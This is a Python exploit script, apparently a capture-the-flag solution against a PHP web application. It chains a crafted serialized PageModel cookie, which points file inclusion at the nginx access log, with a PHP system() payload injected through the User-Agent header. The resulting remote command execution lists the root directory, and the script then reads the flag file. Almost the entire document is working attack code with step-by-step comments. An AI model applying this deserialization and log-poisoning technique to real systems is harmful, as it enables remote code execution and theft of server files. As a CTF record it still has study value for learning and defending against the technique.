import requests
import re
import base64

to_base64 = lambda x: base64.b64encode(x.encode('utf-8')).decode('utf-8')
# Injecting the PHP script into the log file which will be executed and put all files from "/" directory in the log file
# O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";} is the payload for the cookie in order to show
# the log file
log_file_dir = """O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}"""

headers = {
    'User-Agent': "<?php system('ls /');?>",
}
result = requests.get('http://68.183.45.211:30121/', headers=headers, cookies={
    'PHPSESSID': to_base64(log_file_dir)})
# Printing whether the flag IN the log file
print('flag' in result.content.decode('utf-8'))

# ---------------------
# Search for the pattern "flag_..." in the log file and print it

result = requests.get('http://68.183.45.211:30121/', cookies={
    'PHPSESSID': to_base64(log_file_dir)})

print(re.search(r'flag_(.+)', result.content.decode('utf-8')).group())

# ---------------------
# Once we have the flag file name -> we print it
filename = '/flag_oZf8t'
template = f'''O:9:"PageModel":1:{{s:4:"file";s:{len(filename)}:"{filename}";}}'''
result = requests.get('http://68.183.45.211:30121/', cookies={
    'PHPSESSID': base64.b64encode(template.encode('utf-8')).decode('utf-8')})
print(result.content.decode('utf-8'))
